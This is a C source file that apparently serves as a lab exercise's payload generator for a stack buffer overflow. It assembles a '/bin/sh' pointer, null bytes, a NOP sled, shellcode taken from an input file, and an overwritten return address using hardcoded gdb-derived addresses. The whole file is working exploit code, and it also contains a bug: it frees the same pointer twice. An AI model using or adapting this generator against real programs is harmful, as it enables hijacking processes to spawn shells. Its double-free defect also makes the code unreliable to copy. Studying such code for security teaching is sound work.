#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char* littleEndian(char *str, int numChars);

// 0x7fffffffdc30 address of buf
// 0x7ffff7b99673 address of /bin/sh/
// 0x7fffffffdca0

#define ADDR_SIZE 8
#define BITS_IN_BYTE 8

//address of /bin/sh in libc
#define BIN_SH_ADDR "0x7ffff7b99673"
#define BUFFER_ADDR "0x7fffffffdcb0"
//#define BUFFER_ADDR "0x7fffffffdc30" <- buff according to gdb


int main(int argc, char *argv[]){
  FILE *file = fopen("in", "wb");
  FILE *instFp;
  int fileSize;
  int i;
  char ch = 0x90;
  char nul = 0x00;
  char input;
  int numChars;
  unsigned char *instFile;
  unsigned char *addr;
  unsigned char *shAddr;

 
  shAddr = littleEndian(BIN_SH_ADDR, ADDR_SIZE);
  addr = littleEndian(BUFFER_ADDR, ADDR_SIZE);


  if(argc != 3){
    printf("Wrong number of arguments, use ./gen [instructions] [num_bytes_in_buffer]\n");
    printf("Instructions: file of instructions to be run. Size must not exceed num_bytes_in_buffer. Expected to be in hex.\n");
    printf("num_bytes_in_buffer: number of bytes in the buffer (assumes buffer is first local variable).\n");
    exit(1);
  }

  instFile = argv[1];
  numChars = atoi(argv[2]) - ADDR_SIZE; //subtract 8 bytes as we are putting 16 bytes of arguments at beginning of buffer  
  instFp = fopen(instFile, "rb");

  
  if(file == NULL){
    printf("Error opening file. Exiting.");
    exit(1);
  }

  if (instFp == NULL){
    printf("Error opening instruction file. Exiting.");
    exit(1);
  }

  //find out how many characters are in instruction file
  fseek(instFp, 0L, SEEK_END);
  fileSize = ftell(instFp);
  rewind(instFp);
  
  //exit if we can't fit instructions in buffer
  if(fileSize > numChars){
    printf("Instruction set size cannot exceed number of characters in buffer.");
    exit(1);
  }
  
  //write address of 'sh' in libc memory to file first
  fwrite(shAddr, sizeof(char), ADDR_SIZE, file);

  //write 8 null characters to signify end of args for execve
  for(i = 0; i < ADDR_SIZE; i++){
    fwrite(&nul, sizeof(char), 1, file);
  }

  //write nop sled up to number of characters
  for(i = fileSize; i < numChars; i++){
    fwrite(&ch, sizeof(char), 1, file);
  } 

  //write instructions from .dat file to input file
  int j = 0;
  while(j < fileSize){
    input = fgetc(instFp);
    putc(input, file);
    j++;
  }
  

  fwrite(addr, sizeof(char), ADDR_SIZE, file);

  free(shAddr);
  free(addr);
  free(shAddr);

  fclose(file);
  fclose(instFp);
}

/*
  littleEndian takes a character address and a specified required number of bytes,
  it returns the address (assumed to be in the form 0x000000) in little endian format,
  padded with zeroes. 
 */
unsigned char* littleEndian(char *addr, int numBytes){

  //stop people from attempting to write address that is longer than possible
  if(numBytes > ADDR_SIZE){
    return NULL;
  }
  
  //unsigned char *tmpRet = malloc(ADDR_SIZE / 4);
  unsigned char *ret = malloc(ADDR_SIZE);
  char tmp;
  int i = 0, j;

  //convert address to a hex number
  long long hex = strtoll(addr, NULL, 16);

  //pad for size 
  for(i = 0; i < ADDR_SIZE - numBytes; i++){
    ret[i] = 0;
  }

  i = ADDR_SIZE - 1;

  //place hex into char array digit by digit
  while(hex != 0){ 
    ret[i] = hex & 0xFF;
    hex = hex >> BITS_IN_BYTE;
    i--;
  }
   
  //swap byte order
  j = ADDR_SIZE - 1;
  for(i = 0; i < ADDR_SIZE / 2; i++){
    tmp = ret[i];

    ret[i] = ret[j];
    ret[j] = tmp;

    j--;
  }
  
  return ret;
}
